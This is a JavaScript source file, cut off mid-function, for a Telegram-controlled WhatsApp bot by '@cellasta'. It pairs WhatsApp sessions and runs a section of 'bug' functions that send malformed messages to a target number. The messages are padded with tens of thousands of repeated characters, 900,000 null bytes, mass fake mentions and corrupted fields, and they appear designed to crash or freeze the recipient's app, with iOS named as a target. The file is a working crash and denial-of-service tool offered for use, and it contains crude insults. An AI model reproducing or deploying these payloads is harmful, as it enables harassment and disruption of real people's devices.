const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");


function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const cooldowns = new Map();
const COOLDOWN_TIME = 80 * 1000; // 60 detik
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

const GITHUB_RAW_URL =
  "https";

async function checkTokenInGitHub(tokenToCheck) {
  try {
    const response = await axios.get(GITHUB_RAW_URL);

    let tokensData;
    try {
      if (typeof response.data === "object") {
        tokensData = response.data;
      } else {
        tokensData = JSON.parse(response.data);
      }
    } catch (parseError) {
      console.error("Error parsing data:", parseError);
      return false;
    }

    if (!tokensData.tokens) {
      return false;
    }

    const isTokenValid = tokensData.tokens.includes(tokenToCheck);

    return isTokenValid;
  } catch (error) {
    console.error("Error checking token");
    return false;
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `╭─────────────────
│    *MEMULAI*    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `╭─────────────────
│    *RECONNECTING*    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `╭─────────────────
│    *KONEKSI GAGAL*    
│────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `╭─────────────────
│    *TERHUBUNG*    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `╭─────────────────
│    *KODE PAIRING*    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `╭─────────────────
│    *ERROR*    
│────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
  const isValidToken = await checkTokenInGitHub(token);
  if (!isValidToken) {
    console.log(chalk.bold.red("Token tidak terdaftar dalam database!"));
    process.exit(1);
  }

  console.log(`╭─────────────────
│    Telegram NANDEMO X CELLA     
│────────────────
│ Created By @cellasta
╰─────────────────`);

  await initializeWhatsAppConnections();
}

initializeBot();

// [ BUG FUNCTION ]
async function Bug1(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid, "13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "𐎟 ✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧 𐎟",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

//NON CLICK
async function Bug2(sock, jid) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  } catch (err) {
    console.log(err);
  }
}

async function Bug4(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️" + "ꦽ".repeat(9740),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "⚡",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "KONTOL LUH ANJING",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                footerText: "© running since 2020 to 20##?",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(900000),
                    buttonText: {
                      displayText: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "VQuoted",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: jid,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - "Supra MK4" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: "",
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : devorsixcore",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(jid, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: jid },
  });
}

async function Bug3(sock, jid) {
  let target = jid;
  let msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗨𝗻𝗱𝗲𝗿𝗰𝗿𝗮𝘀𝗵",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id,
    participant: { jid: jid },
  });
}
    
    async function IosMJ(sock, jid) {
      await sock.relayMessage(
        jid,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: jid,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/cellasta",
                mediaUrl: "https://t.me/cellasta",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/cellasta",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbsockCampaignId: "smb_sock_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        sock
          ? {
              participant: {
                jid: jid,
              },
            }
          : {}
      );
    }

async function NewIos(sock, jid) {
sock.relayMessage(
    jid,
    {
        extendedTextMessage: {
            text: `𑲭𑲭𝐓𝐀𝐌𝐀⿻𝐑𝐘𝐂⿻¿? ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "FINIX - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    sock
        ? {
              participant: {
                  jid: jid
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}
async function MSGSPAM(sock, jid) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: ".",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, Msg, {
      participant: { jid: jid },
    })
  }
async function Fc(sock, jid) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️" + "ꦾ".repeat(115000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "SSS+",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  contactVcard: true,
                },
                contentText: "lol",
                footerText: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
                buttons: [
                  {
